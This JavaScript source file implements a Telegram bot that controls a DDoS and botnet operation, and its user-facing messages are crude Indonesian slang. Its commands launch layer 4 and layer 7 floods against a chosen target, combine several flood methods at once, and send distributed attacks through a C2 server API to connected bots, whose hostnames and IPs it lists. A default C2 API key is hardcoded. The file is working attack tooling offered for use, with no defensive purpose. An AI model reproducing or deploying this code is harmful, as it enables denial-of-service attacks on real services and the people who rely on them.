import { Telegraf } from 'telegraf';
import { AttackManager } from '../core/attack-manager.js';
import { ComboAttackManager } from '../core/combo-attack.js';
import { LAYER4_METHODS } from '../methods/layer4/index.js';
import { LAYER7_METHODS } from '../methods/layer7/index.js';
import { logger } from '../utils/logger.js';
import axios from 'axios';

export class TelegramBotKasar {
    constructor(token, adminIds, config) {
        this.bot = new Telegraf(token);
        this.adminIds = Array.isArray(adminIds) ? adminIds : [adminIds];
        this.config = config;
        this.activeAttacks = new Map();
        this.setupCommands();
        this.setupHandlers();
    }

    isAdmin(userId) {
        return this.adminIds.includes(userId.toString());
    }

    setupCommands() {
        // Start command
        this.bot.command('start', async (ctx) => {
            if (!this.isAdmin(ctx.from.id)) {
                return ctx.reply('❌ SIAPA LU ANJIR? GAK PUNYA AKSES BEGO!');
            }

            const welcomeMsg = `
🔥 *ARYZZ C2 BOT - VERSI BRUTAL* 🔥

Woy ${ctx.from.first_name}, udah siap ngancurin target? 😈

*📋 COMMAND YANG BISA LU PAKE:*

*🎯 ATTACK COMMANDS:*
/attack - Hajar target pake 1 method
/combo - Hajar pake banyak method sekaligus
/stop - Stop semua attack
/status - Liat attack yang lagi jalan

*📊 INFO COMMANDS:*
/methods - Liat semua method attack
/stats - Statistik serangan lu
/bots - Liat bot yang connect (kalo pake C2)

*⚙️ C2 COMMANDS:*
/c2status - Status C2 server
/c2attack - Launch attack via C2
/c2bots - List semua bot yang connect

*💡 CONTOH PEMAKAIAN:*
\`/attack https://target.com GET 500 120 10\`
Target, Method, Threads, Duration, RPC

Siap hajar? GASKEUN! 🚀
`;
            ctx.replyWithMarkdown(welcomeMsg);
        });

        // Attack command
        this.bot.command('attack', async (ctx) => {
            if (!this.isAdmin(ctx.from.id)) {
                return ctx.reply('❌ LU SIAPA ANJIR? MINGGIR SONO!');
            }

            const args = ctx.message.text.split(' ').slice(1);
            if (args.length < 2) {
                return ctx.reply(`
❌ *SALAH ANJIR FORMAT NYA!*

Format yang bener:
\`/attack <target> <method> [threads] [duration] [rpc]\`

Contoh:
\`/attack https://target.com GET 500 120 10\`
\`/attack 1.2.3.4:80 UDP 1000 60\`

Ketik /methods buat liat method yang ada!
`, { parse_mode: 'Markdown' });
            }

            const target = args[0];
            const method = args[1].toUpperCase();
            const threads = parseInt(args[2]) || 500;
            const duration = parseInt(args[3]) || 120;
            const rpc = parseInt(args[4]) || 10;

            const allMethods = [...LAYER4_METHODS, ...LAYER7_METHODS];
            if (!allMethods.includes(method)) {
                return ctx.reply(`❌ METHOD APAAN TU ANJIR? Ketik /methods buat liat yang bener!`);
            }

            const attackId = `${Date.now()}-${ctx.from.id}`;
            
            ctx.reply(`
🔥 *SIAP-SIAP NGANCURIN TARGET!* 🔥

🎯 Target: \`${target}\`
⚡ Method: *${method}*
🧵 Threads: *${threads}*
⏱ Duration: *${duration}s*
🔄 RPC: *${rpc}*

⏳ Bentar ya, lagi nyiapin amunisi... 💣
`, { parse_mode: 'Markdown' });

            try {
                const attackManager = new AttackManager({
                    target,
                    method,
                    threads,
                    duration,
                    rpc,
                    userAgents: [],
                    referers: [],
                    enableMonitoring: false
                });

                this.activeAttacks.set(attackId, attackManager);

                // Start attack
                attackManager.start().then(() => {
                    const stats = attackManager.stats || {};
                    ctx.reply(`
✅ *ATTACK SELESAI ANJIR!* ✅

📊 *HASIL SERANGAN:*
🎯 Target: \`${target}\`
⚡ Method: *${method}*
📈 Total Request: *${stats.totalRequests || 0}*
✅ Sukses: *${stats.successfulRequests || 0}*
❌ Gagal: *${stats.failedRequests || 0}*
⏱ Durasi: *${duration}s*

${stats.successfulRequests > 0 ? '🔥 TARGET UDAH BABAK BELUR! 🔥' : '⚠️ Target masih kuat anjir!'}
`, { parse_mode: 'Markdown' });

                    this.activeAttacks.delete(attackId);
                }).catch((error) => {
                    ctx.reply(`❌ *GAGAL ANJIR!* Error: ${error.message}`);
                    this.activeAttacks.delete(attackId);
                });

                // Progress updates
                let progressCount = 0;
                const progressInterval = setInterval(() => {
                    if (!this.activeAttacks.has(attackId)) {
                        clearInterval(progressInterval);
                        return;
                    }

                    progressCount++;
                    if (progressCount % 3 === 0) { // Update setiap 30 detik
                        const stats = attackManager.stats || {};
                        ctx.reply(`
⚡ *MASIH NGHAJAR NIH!* ⚡

📊 Progress:
📈 Request: *${stats.totalRequests || 0}*
✅ Sukses: *${stats.successfulRequests || 0}*
❌ Gagal: *${stats.failedRequests || 0}*

💪 TERUS GASKEUN!
`, { parse_mode: 'Markdown' });
                    }
                }, 10000);

            } catch (error) {
                ctx.reply(`❌ *ERROR ANJIR!* ${error.message}`);
            }
        });

        // Combo attack
        this.bot.command('combo', async (ctx) => {
            if (!this.isAdmin(ctx.from.id)) {
                return ctx.reply('❌ NGAPAIN LU DISINI? PERGI SONO!');
            }

            const args = ctx.message.text.split(' ').slice(1);
            if (args.length < 2) {
                return ctx.reply(`
❌ *SALAH FORMAT TOLOL!*

Format:
\`/combo <target> <methods> [threads] [duration]\`

Contoh:
\`/combo https://target.com GET,POST,HTTP2 1000 180\`

Method dipisah pake koma (,) ya!
`, { parse_mode: 'Markdown' });
            }

            const target = args[0];
            const methods = args[1].split(',').map(m => m.trim().toUpperCase());
            const threads = parseInt(args[2]) || 1000;
            const duration = parseInt(args[3]) || 180;

            ctx.reply(`
🔥🔥🔥 *COMBO ATTACK - MODE BRUTAL!* 🔥🔥🔥

🎯 Target: \`${target}\`
⚡ Methods: *${methods.join(', ')}*
🧵 Total Threads: *${threads}*
⏱ Duration: *${duration}s*

💣 SIAP-SIAP ANCUR TOTAL! 💣
`, { parse_mode: 'Markdown' });

            try {
                const comboManager = new ComboAttackManager({
                    target,
                    methods,
                    threads,
                    duration,
                    rpc: 10,
                    userAgents: [],
                    referers: []
                });

                const attackId = `combo-${Date.now()}`;
                this.activeAttacks.set(attackId, comboManager);

                comboManager.start().then(() => {
                    ctx.reply(`
✅ *COMBO ATTACK SELESAI!* ✅

🎯 Target: \`${target}\`
⚡ Methods: *${methods.join(', ')}*
⏱ Duration: *${duration}s*

🔥 TARGET UDAH RATA SAMA TANAH! 🔥
`, { parse_mode: 'Markdown' });

                    this.activeAttacks.delete(attackId);
                }).catch((error) => {
                    ctx.reply(`❌ *COMBO GAGAL!* ${error.message}`);
                    this.activeAttacks.delete(attackId);
                });

            } catch (error) {
                ctx.reply(`❌ *ERROR BEGO!* ${error.message}`);
            }
        });

        // Stop command
        this.bot.command('stop', async (ctx) => {
            if (!this.isAdmin(ctx.from.id)) {
                return ctx.reply('❌ LU BUKAN ADMIN ANJIR!');
            }

            if (this.activeAttacks.size === 0) {
                return ctx.reply('ℹ️ Gak ada attack yang jalan bro!');
            }

            let stopped = 0;
            for (const [attackId, manager] of this.activeAttacks) {
                try {
                    manager.stop();
                    stopped++;
                } catch (e) {}
            }
            this.activeAttacks.clear();

            ctx.reply(`
✅ *ATTACK DISTOP!*

Stopped: *${stopped}* attack(s)

Udah cukup hajarnya? 😏
`, { parse_mode: 'Markdown' });
        });

        // Status command
        this.bot.command('status', async (ctx) => {
            if (!this.isAdmin(ctx.from.id)) {
                return ctx.reply('❌ SIAPA LU?');
            }

            if (this.activeAttacks.size === 0) {
                return ctx.reply('ℹ️ Gak ada attack yang lagi jalan bro!');
            }

            let statusMsg = `📊 *ATTACK STATUS*\n\n`;
            statusMsg += `🔥 Active Attacks: *${this.activeAttacks.size}*\n\n`;

            for (const [attackId, manager] of this.activeAttacks) {
                const stats = manager.stats || {};
                statusMsg += `⚡ Attack ID: \`${attackId.substring(0, 10)}...\`\n`;
                statusMsg += `📈 Requests: *${stats.totalRequests || 0}*\n`;
                statusMsg += `✅ Success: *${stats.successfulRequests || 0}*\n\n`;
            }

            statusMsg += `💪 TERUS GASKEUN!`;

            ctx.replyWithMarkdown(statusMsg);
        });

        // Methods command
        this.bot.command('methods', async (ctx) => {
            if (!this.isAdmin(ctx.from.id)) {
                return ctx.reply('❌ LU BUKAN ADMIN!');
            }

            const msg = `
📋 *DAFTAR METHOD ATTACK* 📋

*🌐 LAYER 7 (HTTP/HTTPS):*
${LAYER7_METHODS.map(m => `• ${m}`).join('\n')}

*🔌 LAYER 4 (TCP/UDP):*
${LAYER4_METHODS.map(m => `• ${m}`).join('\n')}

*Total: ${LAYER4_METHODS.length + LAYER7_METHODS.length} methods*

Pilih yang paling brutal! 🔥
`;
            ctx.replyWithMarkdown(msg);
        });

        // C2 Status
        this.bot.command('c2status', async (ctx) => {
            if (!this.isAdmin(ctx.from.id)) {
                return ctx.reply('❌ NGAPAIN LU?');
            }

            const c2Url = this.config.c2?.url || 'http://localhost:8080';
            const apiKey = this.config.c2?.apiKey || 'aryzz-c2-api-key-2024';

            try {
                const response = await axios.get(`${c2Url}/api/stats/overview`, {
                    headers: { 'X-API-Key': apiKey },
                    timeout: 5000
                });

                const stats = response.data.stats;
                ctx.reply(`
🎯 *C2 SERVER STATUS* 🎯

🤖 *BOTS:*
• Total: *${stats.bots.total}*
• Online: *${stats.bots.online}* 🟢
• Offline: *${stats.bots.offline}* 🔴

⚡ *ATTACKS:*
• Total: *${stats.attacks.total}*
• Running: *${stats.attacks.running}* 🔥
• Completed: *${stats.attacks.completed}* ✅

📊 *REQUESTS:*
• Total: *${stats.requests.total.toLocaleString()}*
• Success: *${stats.requests.successful.toLocaleString()}* ✅
• Failed: *${stats.requests.failed.toLocaleString()}* ❌

💪 BOTNET LU KUAT ANJIR!
`, { parse_mode: 'Markdown' });

            } catch (error) {
                ctx.reply(`❌ *C2 SERVER OFFLINE ATAU ERROR!*\n\nError: ${error.message}`);
            }
        });

        // C2 Attack
        this.bot.command('c2attack', async (ctx) => {
            if (!this.isAdmin(ctx.from.id)) {
                return ctx.reply('❌ LU BUKAN ADMIN TOLOL!');
            }

            const args = ctx.message.text.split(' ').slice(1);
            if (args.length < 2) {
                return ctx.reply(`
❌ *FORMAT SALAH BEGO!*

Format:
\`/c2attack <target> <method> [threads] [duration] [rpc]\`

Contoh:
\`/c2attack https://target.com GET 5000 300 10\`

Ini bakal distributed ke SEMUA bot yang connect! 🔥
`, { parse_mode: 'Markdown' });
            }

            const target = args[0];
            const method = args[1].toUpperCase();
            const threads = parseInt(args[2]) || 5000;
            const duration = parseInt(args[3]) || 300;
            const rpc = parseInt(args[4]) || 10;

            const c2Url = this.config.c2?.url || 'http://localhost:8080';
            const apiKey = this.config.c2?.apiKey || 'aryzz-c2-api-key-2024';

            try {
                ctx.reply(`
🔥🔥🔥 *C2 DISTRIBUTED ATTACK!* 🔥🔥🔥

🎯 Target: \`${target}\`
⚡ Method: *${method}*
🧵 Total Threads: *${threads}*
⏱ Duration: *${duration}s*
🔄 RPC: *${rpc}*

💣 LAUNCHING KE SEMUA BOT... 💣
`, { parse_mode: 'Markdown' });

                const response = await axios.post(
                    `${c2Url}/api/attack/start`,
                    {
                        target,
                        method,
                        threads,
                        duration,
                        rpc
                    },
                    {
                        headers: {
                            'X-API-Key': apiKey,
                            'Content-Type': 'application/json'
                        },
                        timeout: 10000
                    }
                );

                if (response.data.success) {
                    const attack = response.data.attack;
                    ctx.reply(`
✅ *ATTACK LAUNCHED!* ✅

🆔 Attack ID: \`${attack.id}\`
🎯 Target: \`${target}\`
⚡ Method: *${method}*
🤖 Bots: *${attack.botIds?.length || 'ALL'}*

🔥 SEMUA BOT UDAH MULAI NGHAJAR! 🔥

Ketik /c2status buat liat progress!
`, { parse_mode: 'Markdown' });
                } else {
                    ctx.reply(`❌ *GAGAL LAUNCH!* ${response.data.error}`);
                }

            } catch (error) {
                ctx.reply(`❌ *ERROR ANJIR!* ${error.message}`);
            }
        });

        // C2 Bots
        this.bot.command('c2bots', async (ctx) => {
            if (!this.isAdmin(ctx.from.id)) {
                return ctx.reply('❌ LU SIAPA?');
            }

            const c2Url = this.config.c2?.url || 'http://localhost:8080';
            const apiKey = this.config.c2?.apiKey || 'aryzz-c2-api-key-2024';

            try {
                const response = await axios.get(`${c2Url}/api/bots`, {
                    headers: { 'X-API-Key': apiKey },
                    timeout: 5000
                });

                const bots = response.data.bots;
                
                if (bots.length === 0) {
                    return ctx.reply('ℹ️ Belum ada bot yang connect bro!');
                }

                let msg = `🤖 *DAFTAR BOT YANG CONNECT* 🤖\n\n`;
                msg += `Total: *${bots.length}* bot(s)\n\n`;

                bots.forEach((bot, index) => {
                    const status = bot.status === 'online' ? '🟢' : '🔴';
                    msg += `${status} *Bot ${index + 1}*\n`;
                    msg += `• ID: \`${bot.id.substring(0, 8)}...\`\n`;
                    msg += `• Host: ${bot.hostname}\n`;
                    msg += `• IP: ${bot.ip}\n`;
                    msg += `• OS: ${bot.os}\n`;
                    msg += `• Status: *${bot.status}*\n\n`;
                });

                msg += `💪 BOTNET LU SIAP TEMPUR!`;

                ctx.replyWithMarkdown(msg);

            } catch (error) {
                ctx.reply(`❌ *ERROR!* ${error.message}`);
            }
        });

        // Help command
        this.bot.help((ctx) => {
            if (!this.isAdmin(ctx.from.id)) {
                return ctx.reply('❌ LU BUKAN ADMIN!');
            }
            ctx.telegram.sendMessage(ctx.chat.id, 'Ketik /start buat liat semua command!');
        });
    }

    setupHandlers() {
        // Error handler
        this.bot.catch((err, ctx) => {
            logger.error(`Telegram bot error for ${ctx.updateType}:`, err);
            ctx.reply(`❌ *ERROR ANJIR!* ${err.message}`, { parse_mode: 'Markdown' });
        });

        // Non-admin message handler
        this.bot.on('message', (ctx) => {
            if (!this.isAdmin(ctx.from.id)) {
                ctx.reply('❌ LU BUKAN ADMIN! MINGGIR SONO!');
            }
        });
    }

    launch() {
        this.bot.launch();
        logger.success('🔥 TELEGRAM BOT VERSI KASAR UDAH JALAN ANJIR! 🔥');
        logger.info(`👤 Admin IDs: ${this.adminIds.join(', ')}`);
        
        // Graceful stop
        process.once('SIGINT', () => this.bot.stop('SIGINT'));
        process.once('SIGTERM', () => this.bot.stop('SIGTERM'));
    }
}
